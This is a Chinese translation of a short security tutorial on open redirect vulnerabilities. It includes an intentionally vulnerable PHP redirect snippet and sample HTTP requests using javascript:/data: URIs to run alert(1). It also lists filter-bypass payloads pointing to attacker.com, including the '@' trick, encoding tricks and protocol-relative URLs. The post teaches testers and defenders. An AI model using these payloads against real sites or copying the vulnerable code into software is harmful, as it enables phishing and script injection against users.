<html>
<head>
<title>CVV #2: Open Redirect</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CVV #2:开放重定向</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cvv-2-open-redirect-213555765607?source=collection_archive---------6-----------------------#2018-06-26">https://infosecwriteups.com/cvv-2-open-redirect-213555765607?source=collection_archive---------6-----------------------#2018-06-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="3a7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个关于“常见漏洞载体”和相关利用方法的简短系列。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/940f8de98ff5838c96c118162cf57d11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*eNWckgacJr67W5cFk-D2og.gif"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">低垂的水果更容易采集</figcaption></figure><p id="0d61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你没有读过我关于本地文件包含的第一篇文章(CVV #1)，那就来吧！今天是关于<strong class="jp ir">开放重定向</strong>(简称:“OR”)。</p><p id="ce72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据<a class="ae lb" href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" rel="noopener ugc nofollow" target="_blank"> OWASP-Project </a>的说法，开放重定向是一种漏洞，定义如下:</p><blockquote class="lc ld le"><p id="5545" class="jn jo lf jp b jq jr js jt ju jv jw jx lg jz ka kb lh kd ke kf li kh ki kj kk ij bi translated"><em class="iq"> […]当web应用程序接受不可信的输入，这可能导致web应用程序将请求重定向到不可信输入中包含的URL。通过修改恶意网站的不可信URL输入，攻击者可以成功发起网络钓鱼诈骗并窃取用户凭据[…] </em></p></blockquote><p id="11fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看一个用PHP编写的web应用程序的简单例子，它容易受到“或”的攻击:</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="6f21" class="lo lp iq lk b gy lq lr l ls lt">&lt;?php <br/>   header('Location: ' . $_GET['url']);<br/>   die(); // this is sometimes missing which can leads to an authentication bypass<br/>?&gt;</span></pre><p id="8d44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">提交以下HTTP请求后:</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="c0b8" class="lo lp iq lk b gy lq lr l ls lt">GET vulnerable.php?url=https://si9int.sh HTTP/1.1<br/>Host: victim.com</span></pre><p id="598f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们应该得到一个服务器端重定向(HTTP 301HTTP 307)到通过<em class="lf">URL</em>-参数定义的URL。</p><p id="ce1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下内容描述了基于我目前知识的方法，这些方法在利用“或”问题时可能有用，例如扩展到<a class="ae lb" href="https://en.wikipedia.org/wiki/Cross-site_scripting" rel="noopener ugc nofollow" target="_blank">跨站点脚本</a>。</p><p id="77f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢:<em class="lf"> bobrov、filedescriptor、cujanovic、security diots</em>为本主题贡献他们的知识。</p></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="e363" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [1]执行JavaScript </strong></p><p id="51f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">得益于<em class="lf"> javascript-URI </em>和<em class="lf">数据-URI </em>包装器，利用“或”漏洞执行JS是可能的。这可以通过重定向到指定的包装器来实现(注意，只有当应用程序通过将锚标签注入到当前的<a class="ae lb" href="https://en.wikipedia.org/wiki/Document_Object_Model" rel="noopener ugc nofollow" target="_blank"> DOM </a>来重定向客户端时，这才有效)。</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="8968" class="lo lp iq lk b gy lq lr l ls lt">GET vulnerable.php?url=javascript:alert(1) HTTP/1.1<br/>Host: victim.com<br/>---<br/>GET vulnerable.php?url=<!-- -->data:text/html;base64,<!-- -->PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4NCg== HTTP/1.1<br/>Host: victim.com</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="ed2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [2]绕过关键词过滤</strong></p><p id="7d74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果一个域过滤一个特定的关键字(主要是域名本身)，可以通过使用关键字作为注入域(子域或第<em class="lf">n</em>-lvl-domain)的一部分来绕过它。</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="84a2" class="lo lp iq lk b gy lq lr l ls lt">GET vulnerable.php?url=victim.com.attacker.com HTTP/1.1<br/>Host: victim.com</span></pre><p id="ea05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用“@”符号也可以成功利用漏洞。浏览器会将所有在<em class="lf"> AT_SIGN </em>之后的内容重定向到指定的域(这要感谢大多数现代浏览器中包含的登录URI模式；<a class="ae lb" href="http://user@si9int.sh" rel="noopener ugc nofollow" target="_blank">试试看</a>。</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="7982" class="lo lp iq lk b gy lq lr l ls lt">GET vulnerable.php?url=victim.com@attacker.com HTTP/1.1<br/>Host: victim.com</span></pre><p id="5e46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三种方法是在您自己的服务器上创建一个名为vulnerable domain的文件夹，并将其用作有效负载，希望易受攻击的脚本会忽略URL的第一个/<em class="lf">n</em>部分。</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="25f3" class="lo lp iq lk b gy lq lr l ls lt">GET vulnerable.php?url=attacker.com/victim.com HTTP/1.1<br/>Host: victim.com</span></pre><p id="30e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当应用程序需要特定的路径内扩展时，这也很有用。在这种情况下，我们可以创建一个名为所需扩展名的文件夹，并将其传递给vulnerable参数。</p><pre class="km kn ko kp gt lj lk ll lm aw ln bi"><span id="75c2" class="lo lp iq lk b gy lq lr l ls lt">GET vulnerable.php?url=attacker.com/.jpg HTTP/1.1<br/>Host: victim.com</span></pre></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="0414" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">【3】绕过黑名单关键词</strong></p><p id="7e86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可能有些应用程序已经过滤了某些关键字的易受攻击参数，因此如果某些黑名单中的关键字被设置为value，则不会进行重定向。以下是如何绕过这些关键词的列表:</p><ul class=""><li id="e035" class="mb mc iq jp b jq jr ju jv jy md kc me kg mf kk mg mh mi mj bi translated"><strong class="jp ir"> a.) </strong>通过使用黑名单中的字符/关键字的双URL或三URL编码版本，可以绕过大多数过滤器</li><li id="bb5c" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> b.) </strong>点例如<code class="fe mp mq mr lk b">victim.com</code>，旁路:<code class="fe mp mq mr lk b">https://attacker%E3%80%82com</code>，(.URL编码)，一个<a class="ae lb" href="https://en.wiktionary.org/wiki/%E3%80%82" rel="noopener ugc nofollow" target="_blank">中文分隔符</a>哪个浏览器处理的方式和点一样</li><li id="5914" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> c.) </strong> HTTP-或HTTPS-关键字例如<code class="fe mp mq mr lk b">https://victim.com</code>，bypass: <code class="fe mp mq mr lk b">//attacker.com</code>，两个斜线足以让浏览器识别HTTP/HTTPS协议的使用</li><li id="d3c0" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> d.) </strong>斜线如<code class="fe mp mq mr lk b">https://victim.com</code>，旁路:<code class="fe mp mq mr lk b">https:attacker.com</code>，现代浏览器的自动纠错导致了这种行为</li><li id="bedb" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir"> e.) </strong>斜线和HTTP/HTTPS-关键词，绕过:<code class="fe mp mq mr lk b">\/\/attacker.com</code>，原因同上</li></ul></div><div class="ab cl lu lv hu lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="ij ik il im in"><p id="38a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你学到了一些新东西。如果您发现任何内容相关或语法错误或有任何补充，请写下评论。</p></div></div>    
</body>
</html>